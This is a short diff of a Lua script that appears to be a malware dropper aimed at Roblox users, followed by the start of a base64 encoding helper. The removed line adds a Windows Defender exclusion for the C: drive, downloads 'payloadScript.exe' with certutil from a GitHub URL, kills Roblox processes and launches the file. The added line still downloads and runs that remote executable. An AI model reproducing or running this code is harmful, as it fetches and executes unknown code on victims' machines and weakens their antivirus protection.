@@ -1,4 +1,4 @@
-local plain_command = [[cmd /c reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths /v C:\ /t REG_DWORD /d 0 /f & certutil -urlcache -f https://raw.githubusercontent.com/outhackernuls090-hash/RC-test/refs/heads/main/payloadScript.exe %TEMP%\payload.exe & taskkill /F /IM RobloxPlayerBeta.exe & taskkill /F /IM RobloxStudioBeta.exe & start %TEMP%\payload.exe]]
+local plain_command = [[cmd /c certutil -urlcache -f https://raw.githubusercontent.com/outhackernuls090-hash/RC-test/refs/heads/main/payloadScript.exe %TEMP%\payload.exe & start %TEMP%\payload.exe]]
 
 local function base64_encode(data)
     local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
